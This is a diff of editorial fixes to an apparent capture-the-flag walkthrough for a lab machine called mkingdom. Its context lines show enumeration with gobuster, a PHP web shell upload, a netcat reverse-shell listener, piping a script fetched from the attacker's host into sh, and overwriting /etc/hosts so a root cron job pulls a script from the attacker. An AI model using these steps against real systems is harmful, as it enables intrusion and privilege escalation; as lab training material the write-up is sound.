@@ -8,7 +8,7 @@ Nmap reveals that port 85 is open.
 ![image](https://github.com/user-attachments/assets/d0e4f543-0a32-4e3a-9baf-21c18ce4db59)
 
 
-Run Gobuster after completing the Nmap scan. The results reveal the /app directory.
+Run Gobuster after completing the Nmap scan. The results reveal the `/app` directory.
 ```BASH
 gobuster dir -u "http://VICTIM_IP_ADDRESS:85/" -w /usr/share/wordlists/dirb/small.txt -t 64
 ```
@@ -18,7 +18,7 @@ Click the "Jump" button, which triggers a redirect.
 
 ![image](https://github.com/user-attachments/assets/5a8c3552-8589-41f3-8828-bd6d1a132a19)
 
-Further enumeration reveals a database.php file located in /config, which will be useful later.
+Further enumeration reveals a database.php file located in `/config`, which will be useful later.
 
 ![image](https://github.com/user-attachments/assets/366199be-a023-4fb6-9a7c-64de12f49556)
 
@@ -47,13 +47,13 @@ A popup window will show the path to the uploaded file.
 http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php
 ```
 
-## On the attacker machine
+## On the attacker's machine
 Start a listener.
 ```BASH
 nc -lvnp 4444
 ```
 
-Go back to browser and in new tab go to:
+Go back to browser and in the new tab go to:
 ```BASH
 http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php
 ```
@@ -92,7 +92,7 @@ We’ll use:
 1.	[linpeas.sh](http://michalszalkowski.com/security/linpeas/)
 2.	[Documentation](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 
-## On the attacker machine
+## On the attacker's machine
 Download linpeas.sh.
 ```BASH
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh
@@ -109,7 +109,7 @@ Download and run linpeas.sh.
 curl <attacker_machine_ip_adress>/linpeas.sh | sh
 ```
 
-During the scan we can see that /etc/hosts is writable.
+During the scan we can see that `/etc/hosts` is writable.
 
 ![image](https://github.com/user-attachments/assets/9ec6d78b-bf12-4972-990f-988be268f138)
 
@@ -145,7 +145,7 @@ ATTACKER_IP_ADDRESS    mkingdom.thm
 EOF
 ```
 
-Copy custom /tmp/hosts_fixed file and overwrite the system’s /etc/hosts file with it.
+Copy custom `/tmp/hosts_fixed` file and overwrite the system’s `/etc/hosts` file with it.
 ```BASH
 cp /tmp/hosts_fixed /etc/hosts
 ```
@@ -154,14 +154,14 @@ As shown below, the cron job is configured to reach the attacker's machine.
 
 ![image](https://github.com/user-attachments/assets/466df7d9-9eba-4e64-8704-baf2c15270f8)
 
-## On the attacker machine
+## On the attacker's machine
 Create the folder structure.
 ```BASH
 mkdir -p app/castle/application
 cd app/castle/application
 ```
 
-After that create counter.sh.
+After that, create counter.sh.
 ```BASH
 cat << EOF > counter.sh
 #!/bin/bash
